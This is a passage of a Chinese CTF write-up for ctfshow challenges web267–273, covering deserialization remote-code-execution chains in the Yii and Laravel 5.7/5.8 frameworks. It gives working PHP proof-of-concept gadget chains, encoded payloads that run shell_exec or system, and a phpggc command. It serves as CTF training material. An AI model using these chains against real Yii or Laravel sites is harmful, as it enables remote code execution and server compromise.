double-quoted-string">"cTFSHOW"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"xxxxxx"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"xxxxxx"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="web267-Yii框架"><a href="#web267-Yii框架" class="headerlink" title="web267(Yii框架)"></a>web267(Yii框架)</h4><p>弱密码<code>admin/admin</code>登陆后，About界面发现注释<code>&lt;!--?view-source --&gt;</code></p><p>于是访问<code>index.php?r=site/about&amp;view-source</code></p><pre class="language-php" data-language="php"><code class="language-php"> <span class="token comment">///backdoor/shell</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>搜了一下知道是 <code>Yii</code> 框架的反序列化漏洞。</p><p><a href="https://www.cnblogs.com/thresh/p/13743081.html">Yii反序列化漏洞分析</a></p><p>Poc</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">CreateAction</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'shell_exec'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cp /flag 3.txt'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>CreateAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'close'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">CreateAction</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>这里 <code>system</code> 不能用，用了 <code>shell_exec</code>。</p><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token operator">/</span>index<span class="token operator">.</span>php<span class="token operator">?</span>r<span class="token operator">=</span>backdoor<span class="token operator">%</span><span class="token number">2</span>Fshell<span class="token operator">&amp;</span>code<span class="token operator">=</span>TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6MTA6InNoZWxsX2V4ZWMiO3M6MjoiaWQiO3M6MTQ6ImNwIC9mbGFnIDMudHh0Ijt9aToxO3M6MzoicnVuIjt9fX19</code></pre><h4 id="web268-270-Yii框架"><a href="#web268-270-Yii框架" class="headerlink" title="web268-270(Yii框架)"></a>web268-270(Yii框架)</h4><p>做法一样但是需要修改poc，因为存在过滤 </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Action</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexAction</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token variable">$func</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token variable">$param</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>web</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">MultiFieldSession</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$writeCallback</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">DbSession</span> <span class="token keyword">extends</span> <span class="token class-name">MultiFieldSession</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">writeCallback</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"run"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>base<span class="token punctuation">\</span>BaseObject</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>web<span class="token punctuation">\</span>DbSession</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell_exec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cp /f* 1.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//此处写命令</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token operator">?</span>r<span class="token operator">=</span>backdoor<span class="token operator">/</span>shell<span class="token operator">&amp;</span>code<span class="token operator">=</span>TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czoxMjoiY3AgL2YqIDEudHh0Ijt9aToxO3M6MzoicnVuIjt9fX0<span class="token operator">=</span></code></pre><h4 id="web271-Laravel5-7-反序列化漏洞"><a href="#web271-Laravel5-7-反序列化漏洞" class="headerlink" title="web271(Laravel5.7 反序列化漏洞)"></a>web271(Laravel5.7 反序列化漏洞)</h4><p><a href="https://blog.csdn.net/weixin_45678034/article/details/122292624">Laravel5.7反序列化RCE漏洞分析</a></p><p>空格被过滤注意修改最后的payload</p><p>Poc</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Testing</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">PendingCommand</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$command</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$parameters</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$app</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">,</span> <span class="token variable">$parameters</span><span class="token punctuation">,</span><span class="token variable">$class</span><span class="token punctuation">,</span><span class="token variable">$app</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">command</span> <span class="token operator">=</span> <span class="token variable">$command</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">parameters</span> <span class="token operator">=</span> <span class="token variable">$parameters</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token operator">=</span><span class="token variable">$class</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">app</span><span class="token operator">=</span><span class="token variable">$app</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Auth</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">GenericUser</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$attributes</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$attributes</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">attributes</span> <span class="token operator">=</span> <span class="token variable">$attributes</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Application</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$hasBeenBootstrapped</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$bindings</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$bind</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">bindings</span><span class="token operator">=</span><span class="token variable">$bind</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token variable">$genericuser</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Auth<span class="token punctuation">\</span>GenericUser</span><span class="token punctuation">(</span>        <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string double-quoted-string">"expectedOutput"</span><span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token operator">=></span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string double-quoted-string">"expectedQuestions"</span><span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token operator">=></span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span>             <span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$application</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Application</span><span class="token punctuation">(</span>        <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string double-quoted-string">"Illuminate\Contracts\Console\Kernel"</span><span class="token operator">=></span>                <span class="token keyword">array</span><span class="token punctuation">(</span>                    <span class="token string double-quoted-string">"concrete"</span><span class="token operator">=></span><span class="token string double-quoted-string">"Illuminate\Foundation\Application"</span>                     <span class="token punctuation">)</span>             <span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pendingcommand</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Testing<span class="token punctuation">\</span>PendingCommand</span><span class="token punctuation">(</span>        <span class="token string double-quoted-string">"system"</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac /fl*'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token variable">$genericuser</span><span class="token punctuation">,</span>        <span class="token variable">$application</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$pendingcommand</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>或者使用phpgcc<code>php  phpggc Laravel/RCE6 &quot;system(&#39;cat /flag&#39;);&quot; --url</code></p><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token constant">POST</span><span class="token punctuation">:</span> data<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A44<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CFoundation<span class="token operator">%</span><span class="token number">5</span>CTesting<span class="token operator">%</span><span class="token number">5</span>CPendingCommand<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A10<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>command<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>system<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A13<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>parameters<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>tac<span class="token operator">+</span><span class="token operator">%</span><span class="token number">2</span>Ffl<span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>app<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A33<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CFoundation<span class="token operator">%</span><span class="token number">5</span>CApplication<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A22<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>hasBeenBootstrapped<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bb<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>bindings<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A35<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CContracts<span class="token operator">%</span><span class="token number">5</span>CConsole<span class="token operator">%</span><span class="token number">5</span>CKernel<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>concrete<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A33<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CFoundation<span class="token operator">%</span><span class="token number">5</span>CApplication<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>test<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A27<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CAuth<span class="token operator">%</span><span class="token number">5</span>CGenericUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A13<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>attributes<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A14<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>expectedOutput<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">221</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A17<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>expectedQuestions<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">221</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D</code></pre><h4 id="web272-273-Laravel5-8-反序列化漏洞"><a href="#web272-273-Laravel5-8-反序列化漏洞" class="headerlink" title="web272-273(Laravel5.8 反序列化漏洞)"></a>web272-273(Laravel5.8 反序列化漏洞)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">PhpParser<span class="token punctuation">\</span>Node<span class="token punctuation">\</span>Scalar<span class="token punctuation">\</span>MagicConst</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Line</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Mockery<span class="token punctuation">\</span>Generator</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">MockDefinition</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$config</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token variable">$config</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Mockery<span class="token punctuation">\</span>Loader</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">EvalLoader</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Bus</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Dispatcher</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$queueResolver</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$queueResolver</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">queueResolver</span> <span class="token operator">=</span> <span class="token variable">$queueResolver</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Console</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">QueuedCommand</span>    <span class="token punctuation">&#123;</span>        <span class="token 